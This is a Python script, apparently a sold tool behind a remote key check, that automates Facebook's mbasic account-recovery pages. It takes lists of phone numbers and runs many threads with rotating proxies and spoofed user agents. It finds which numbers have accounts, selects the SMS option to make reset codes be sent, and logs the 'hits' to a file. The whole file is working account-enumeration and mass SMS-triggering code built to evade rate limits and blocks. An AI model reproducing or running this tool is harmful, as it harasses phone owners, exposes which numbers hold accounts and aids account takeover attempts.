import os
import sys
import time
import threading
import queue
import requests
import random
import re
from bs4 import BeautifulSoup
from datetime import datetime
from urllib.parse import unquote

# --- COLOR SETTINGS ---
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore:
        GREEN = "\033[92m"
        RED = "\033[91m"
        YELLOW = "\033[93m"
        CYAN = "\033[96m"
        BLUE = "\033[94m"
        WHITE = "\033[97m"
        RESET = "\033[0m"
    class Style:
        BRIGHT = "\033[1m"
        RESET_ALL = "\033[0m"

# --- CONFIGURATION ---
class BotConfig:
    TOOL_NAME = "ADVANCE MOBILE TOOLS"
    VERSION = "3.0.0 PRO"
    ADMIN = "@toolsadmin_A"
    KEY_URL = "https://script.google.com/macros/s/AKfycbz0qQGXtFxyfanZb33MAuSYN3Mch_3bGuYRZ2Nxw1kHA0qxqq5urusH3sf2k1EHgORR/exec"

# --- KEY SYSTEM ---
def get_hwid():
    try:
        if hasattr(sys, 'getandroidapilevel'):
            from jnius import autoclass
            Secure = autoclass('android.provider.Settings$Secure')
            context = autoclass('org.kivy.android.PythonActivity').mActivity.getContentResolver()
            return Secure.getString(context, Secure.ANDROID_ID)
        else:
            import uuid
            return str(uuid.getnode())
    except:
        return "UNKNOWN_DEVICE"

def validate_key(key, hwid):
    try:
        url = f"{BotConfig.KEY_URL}?action=check&key={key}&hwid={hwid}"
        response = requests.get(url, timeout=15)
        status = response.text.strip()
        
        if status == "APPROVED":
            return True, f"{Fore.GREEN}[✓] Access Granted!"
        elif status == "EXPIRED":
            return False, f"{Fore.RED}[X] Key Expired!"
        elif status == "HWID_MISMATCH":
            return False, f"{Fore.RED}[X] Key linked to another device!"
        elif status == "INVALID":
            return False, f"{Fore.RED}[X] Invalid Key!"
        else:
            return False, f"{Fore.RED}[!] Server Error: {status}"
    except Exception as e:
        return False, f"{Fore.RED}[!] Connection Failed. Check Internet."

def check_key_system():
    clear_screen()
    print(Fore.CYAN + Style.BRIGHT + f"""
    ╔═══════════════════════════════════╗
    ║       {BotConfig.TOOL_NAME}      ║
    ║          KEY SYSTEM               ║
    ╚═══════════════════════════════════╝
    """)
    
    hwid = get_hwid()
    print(f"{Fore.YELLOW}[!] Device ID: {Fore.WHITE}{hwid}")
    print(f"{Fore.YELLOW}[!] Get Key: {Fore.WHITE}{BotConfig.ADMIN}")
    
    if os.path.exists("key.txt"):
        try:
            with open("key.txt", "r") as f:
                saved_key = f.read().strip()
            if saved_key:
                print(f"\n{Fore.CYAN}[*] Checking Saved Key...")
                valid, msg = validate_key(saved_key, hwid)
                print(msg)
                if valid:
                    time.sleep(1)
                    return True
                else:
                    print(f"{Fore.YELLOW}[!] Saved key invalid or expired.")
        except: pass
    
    while True:
        user_key = input(f"\n{Fore.GREEN}[?] Enter Key: {Fore.WHITE}").strip()
        if not user_key: continue
        
        print(f"{Fore.CYAN}[*] Checking...")
        valid, msg = validate_key(user_key, hwid)
        print(msg)
        
        if valid:
            try:
                with open("key.txt", "w") as f:
                    f.write(user_key)
            except: pass
            time.sleep(1)
            return True

# --- GLOBALS ---
log_queue = queue.Queue()
is_running = False
stats = {"success": 0, "fail": 0, "captcha": 0, "error": 0, "total": 0}
print_lock = threading.Lock()
PROXIES = [] 
PROXY_TYPE = "http"

try:
    if not os.path.exists("debug_logs"):
        os.makedirs("debug_logs")
except: pass

# --- LEGACY USER AGENTS ---
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 2.3.4; GT-I9100 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux; U; Android 2.2; en-us; SCH-I800 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
    "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
]

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear_screen()
    print(Fore.GREEN + Style.BRIGHT + f"""
    ╔═══════════════════════════════════╗
    ║       {BotConfig.TOOL_NAME}      ║
    ║          {BotConfig.VERSION}          ║
    ╚═══════════════════════════════════╝
    """ + Fore.WHITE)
    print(f"{Fore.CYAN}[+] Engine: Requests (Smart Redirect)")
    print(f"{Fore.CYAN}[+] Fix: Handles Language Redirects")
    print(f"{Fore.CYAN}[+] Time: {datetime.now().strftime('%H:%M:%S')}")
    print("-" * 40)

def log_message(msg, type="info"):
    timestamp = datetime.now().strftime('%H:%M:%S')
    with print_lock:
        if type == "success":
            print(f"{Fore.GREEN}[{timestamp}] ✅ {msg}")
        elif type == "error":
            print(f"{Fore.RED}[{timestamp}] ❌ {msg}")
        elif type == "warning":
            print(f"{Fore.YELLOW}[{timestamp}] ⚠️  {msg}")
        elif type == "step":
            print(f"{Fore.BLUE}[{timestamp}] ➡️  {msg}")
        else:
            print(f"{Fore.WHITE}[{timestamp}] ℹ️  {msg}")

def save_debug_html(number, content, reason="unknown"):
    try:
        base_dir = os.path.abspath("debug_logs")
        if not os.path.exists(base_dir):
            os.makedirs(base_dir)
        timestamp = datetime.now().strftime('%H%M%S')
        safe_number = "".join(x for x in str(number) if x.isalnum())
        filename = os.path.join(base_dir, f"{safe_number}_{reason}_{timestamp}.html")
        with open(filename, "wb") as f:
            f.write(content)
        return filename
    except: return ""

def get_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://mbasic.facebook.com/',
    }

def get_proxy():
    if not PROXIES: return None
    raw_proxy = random.choice(PROXIES).strip()
    if "://" in raw_proxy:
        scheme, remainder = raw_proxy.split("://", 1)
    else:
        scheme = PROXY_TYPE
        remainder = raw_proxy
    parts = remainder.split(":")
    if len(parts) == 4:
        formatted_proxy = f"{scheme}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        formatted_proxy = f"{scheme}://{parts[0]}:{parts[1]}"
    else:
        formatted_proxy = raw_proxy if "://" in raw_proxy else f"{scheme}://{raw_proxy}"
    return {"http": formatted_proxy, "https": formatted_proxy}

def force_mbasic(url):
    if not url: return "https://mbasic.facebook.com/login/identify/"
    if "facebook.com" in url:
        url = url.replace("www.facebook.com", "mbasic.facebook.com")
        url = url.replace("m.facebook.com", "mbasic.facebook.com")
        url = url.replace("free.facebook.com", "mbasic.facebook.com")
        url = url.replace("d.facebook.com", "mbasic.facebook.com")
    return url

def format_action_url(action):
    if not action: return "https://mbasic.facebook.com/login/identify/"
    if action.startswith("http"): return force_mbasic(action)
    return "https://mbasic.facebook.com" + action

def check_and_follow_redirect(session, content, headers):
    try:
        soup = BeautifulSoup(content, 'html.parser')
        redirect_url = None
        
        # 1. Meta Refresh (Robust Regex)
        meta_refresh = soup.find('meta', attrs={'http-equiv': re.compile(r'^refresh$', re.I)})
        if meta_refresh:
            content_attr = meta_refresh.get('content', '')
            match = re.search(r'url\s*=\s*([^;]+)', content_attr, re.I)
            if match:
                redirect_url = unquote(match.group(1).strip("'\""))
                log_message("Detected Meta Redirect", "step")

        # 2. JS Redirect (Window Location)
        if not redirect_url:
            for script in soup.find_all('script'):
                if script.string:
                    match = re.search(r'(?:window|document)\.location(?:\.href)?\s*=\s*["\']([^"\']+)["\']', script.string)
                    if match:
                        redirect_url = unquote(match.group(1).replace('\\/', '/'))
                        log_message("Detected JS Redirect", "step")
                        break

        # 3. Fallback: Single Link (Any Language)
        # If page is small (< 3KB) and has 1-3 links, it's a redirect anchor
        if not redirect_url and len(content) < 3000:
            links = soup.find_all('a')
            if len(links) > 0 and len(links) <= 3:
                 href = links[0].get('href')
                 if href:
                     log_message("Detected Fallback Link Redirect", "step")
                     redirect_url = href

        if redirect_url:
            redirect_url = force_mbasic(redirect_url)
            return session.get(redirect_url, headers=headers, timeout=15)
    except: pass
    return None

def handle_cookie_consent(session, content, headers):
    soup = BeautifulSoup(content, 'html.parser')
    text_lower = soup.get_text().lower()
    if "allow" in text_lower or "accept" in text_lower or "cookie" in text_lower or "data policy" in text_lower:
        try:
            form = soup.find('form', {'method': 'post'})
            if form:
                action_url = format_action_url(form.get('action', ''))
                data = {}
                for inp in form.find_all('input'):
                    if inp.get('name'): data[inp.get('name')] = inp.get('value', '')
                session.post(action_url, headers=headers, data=data, timeout=10)
                return True
        except: pass
    return False

# --- SUCCESS CHECK LOGIC ---
def check_success(soup, content_str):
    text_lower = content_str.lower()
    
    keywords = [
        "enter the 6-digit code", "we sent a code", "check your sms", 
        "enter security code", "sent to your", "digit code", 
        "we've sent your code", "enter the code", "your code is",
        "কোড লিখুন", "আপনার কোড" # Bengali keywords
    ]
    if any(k in text_lower for k in keywords): return True

    if soup.find('input', {'name': 'n'}): return True

    # Bloks JSON Check
    if '"event_step","event","extra_client_data_bks_input"' in content_str:
         if '"pre_mt_behavior","search_sent_client"' in content_str: return True
         if '"event","search_error_dialog_shown"' in content_str: return False

    return False

def process_number(number, thread_id):
    try:
        log_message(f"Thread-{thread_id}: Checking {number}...", "info")
        session = requests.Session()
        headers = get_random_headers()
        proxies = get_proxy()
        if proxies:
            try: session.proxies.update(proxies)
            except: return 'error'

        url = "https://mbasic.facebook.com/login/identify/"
        req1 = None
        form = None
        
        # 1. INITIAL REQUEST LOOP (Increased retries for redirects)
        for attempt in range(4): 
            try:
                # If it's a redirect follow-up, use req1 (which holds the new url response), else start new
                if not req1:
                    req1 = session.get(url, headers=headers, timeout=15)
                
                # Check for redirect IMMEDIATELY
                redir = check_and_follow_redirect(session, req1.content, headers)
                if redir: 
                    req1 = redir
                    continue # Loop back to check the NEW page for redirects/forms

                if handle_cookie_consent(session, req1.content, headers):
                    req1 = session.get(url, headers=headers, timeout=15)

                soup = BeautifulSoup(req1.content, 'html.parser')
                page_title = soup.title.get_text() if soup.title else "No Title"
                text_lower = soup.get_text().lower()
                
                if "error facebook" in page_title.lower() or "something went wrong" in text_lower:
                    if attempt < 3: time.sleep(2); continue
                    else: return 'blocked'
                
                # Auto Redirect for Login Page
                if soup.find('input', {'name': 'pass'}):
                    recover_link = soup.find('a', href=re.compile(r'(recover|identify)'))
                    if recover_link:
                        href = format_action_url(recover_link['href'])
                        req1 = session.get(href, headers=headers, timeout=15)
                        continue # Loop back to process recover page

                target_input = soup.find('input', {'name': 'email'})
                if target_input: form = target_input.find_parent('form')
                if not form:
                    forms = soup.find_all('form')
                    for f in forms:
                        if 'identify' in f.get('action', '') or 'search' in f.get('action', ''): form = f; break
                if not form:
                    forms = soup.find_all('form')
                    for f in forms:
                        if f.get('method', '').lower() == 'post' and f.find('input'): form = f; break
                if form: break 
            except: time.sleep(1)
        
        if not form: 
            # Final check if it was actually a success page without form
            if req1 and check_success(BeautifulSoup(req1.content, 'html.parser'), req1.text):
                save_debug_html(number, req1.content, "success_hit")
                return 'success'
            return 'error'

        action_url = format_action_url(form.get('action', ''))
        data = {}
        for inp in form.find_all('input'):
            if inp.get('name'): data[inp.get('name')] = inp.get('value', '')
        data['email'] = number
        
        req_next = None
        try:
            req_next = session.post(action_url, headers=headers, data=data, timeout=15)
        except: return 'net_error'

        for step in range(1, 5):
            redir = check_and_follow_redirect(session, req_next.content, headers)
            if redir: req_next = redir

            content_str = req_next.text
            soup = BeautifulSoup(req_next.content, 'html.parser')
            text_lower = soup.get_text().lower()

            if check_success(soup, content_str):
                save_debug_html(number, req_next.content, "success_hit")
                return 'success'

            if "did not match" in text_lower or "no search results" in text_lower: return 'not_found'
            if "captcha" in text_lower or "security check" in text_lower: return 'captcha'
            if "something went wrong" in text_lower: return 'blocked'

            try_another_way = soup.find('a', href=lambda x: x and '/recover/initiate/' in x)
            if try_another_way:
                 link = format_action_url(try_another_way['href'])
                 try:
                     req_next = session.get(link, headers=headers, timeout=15)
                     continue 
                 except: return 'net_error'

            form = soup.find('form', {'method': 'post'})
            if not form:
                # If no form but has success keywords in JSON/Text, treat as success
                if check_success(soup, content_str):
                     save_debug_html(number, req_next.content, "success_hit")
                     return 'success'
                
                # Check for "Continue" button even without form (sometimes link)
                continue_link = soup.find('a', string=re.compile(r'Continue|Next|অব্যাহত', re.I))
                if continue_link:
                    href = format_action_url(continue_link['href'])
                    req_next = session.get(href, headers=headers, timeout=15)
                    continue

                save_debug_html(number, req_next.content, f"step_{step}_no_form")
                break

            action_url = format_action_url(form.get('action', ''))
            data = {}
            for inp in form.find_all('input'):
                if inp.get('name'): data[inp.get('name')] = inp.get('value', '')

            radios = form.find_all('input', {'type': 'radio'})
            sms_radio_found = False
            
            if radios:
                for radio in radios:
                    val = radio.get('value', '').lower()
                    label_text = ""
                    if radio.get('id'):
                        l = soup.find('label', {'for': radio.get('id')})
                        if l: label_text = l.get_text().lower()
                    
                    if "sms" in val or "sms" in label_text:
                        data[radio.get('name')] = radio.get('value')
                        sms_radio_found = True
                        break
                
                if not sms_radio_found:
                    data[radios[0].get('name')] = radios[0].get('value')

            submit_btn = form.find('input', {'type': 'submit'})
            if not submit_btn: submit_btn = form.find('button', {'type': 'submit'})
            if submit_btn and submit_btn.get('name'):
                data[submit_btn.get('name')] = submit_btn.get('value', '')

            try:
                time.sleep(1) 
                req_next = session.post(action_url, headers=headers, data=data, timeout=15)
            except: return 'net_error'

        return 'unknown'
    except: return 'error'

def worker(numbers, thread_id):
    global is_running
    while is_running and not numbers.empty():
        try:
            number = numbers.get()
            stats['total'] += 1
            result = process_number(number, thread_id)
            
            if result == 'success':
                stats['success'] += 1
                log_message(f"CODE SENT: {number}", "success")
                with open("hits.txt", "a") as f: f.write(f"{number}\n")
            elif result == 'not_found':
                stats['fail'] += 1
                print(f"{Fore.RED}NO ACCOUNT: {number}")
            elif result == 'captcha':
                log_message(f"CAPTCHA: {number}", "warning")
            elif result == 'net_error':
                log_message(f"NETWORK ERROR: {number}", "error")
                stats['error'] += 1
            elif result == 'blocked':
                 log_message(f"IP BLOCKED: {number}", "error")
                 stats['error'] += 1
            elif result == 'unknown':
                log_message(f"UNKNOWN: {number}", "warning")
            elif result == 'error':
                stats['error'] += 1
        except: pass
        finally: numbers.task_done()

def main():
    if not check_key_system():
        sys.exit()

    global is_running, PROXIES, PROXY_TYPE
    print_banner()
    
    try: 
        import requests, bs4
    except ImportError:
        print(Fore.RED + "Run: pip install requests beautifulsoup4")
        return
        
    try: import socks
    except ImportError: pass

    use_proxy = input(Fore.YELLOW + "Use Proxy? (y/n): ").lower()
    if use_proxy == 'y':
        p_path = input(Fore.WHITE + "Enter Proxy File Path: ")
        try:
            with open(p_path, 'r') as f:
                PROXIES = [l.strip() for l in f if l.strip()]
            log_message(f"Loaded {len(PROXIES)} Proxies.", "info")
            print(Fore.YELLOW + "\nSelect Proxy Type:\n[1] HTTP/HTTPS\n[2] SOCKS4\n[3] SOCKS5")
            p_type = input(Fore.WHITE + "> ")
            if p_type == '2': PROXY_TYPE = "socks4"
            elif p_type == '3': PROXY_TYPE = "socks5"
            else: PROXY_TYPE = "http"
            if "socks" in PROXY_TYPE:
                try: import socks
                except ImportError:
                    print(Fore.RED + "⚠️  For SOCKS proxy, you MUST run: pip install pysocks")
                    sys.exit()
        except:
            log_message("Proxy file not found. Running without proxy.", "warning")

    print(Fore.YELLOW + "\n[1] File Clone")
    print(Fore.YELLOW + "[2] Manual Input")
    choice = input(Fore.WHITE + "Select Option > ")
    target_list = []
    
    if choice == '1':
        f_path = input(Fore.WHITE + "Enter file path: ")
        try:
            with open(f_path, 'r') as f:
                target_list = [l.strip() for l in f if l.strip()]
        except: return
    elif choice == '2':
        print("Enter numbers ('done' to stop):")
        while True:
            n = input("> ")
            if n == 'done': break
            if n: target_list.append(n)
    else: return

    if not target_list: return
    
    try: tc = int(input(Fore.WHITE + "Threads (10-30): "))
    except: tc = 10
        
    print_banner()
    q = queue.Queue()
    for n in target_list: q.put(n)
        
    is_running = True
    threads = []
    for i in range(tc):
        t = threading.Thread(target=worker, args=(q, i+1))
        t.daemon = True
        t.start()
        threads.append(t)
        
    try:
        while any(t.is_alive() for t in threads): time.sleep(1)
    except KeyboardInterrupt:
        is_running = False
        print("\nStopping...")
        
    print(f"\n{Fore.GREEN}Completed. SENT: {stats['success']} | NO ACC: {stats['fail']} | ERRORS: {stats['error']}")

if __name__ == "__main__":
    main()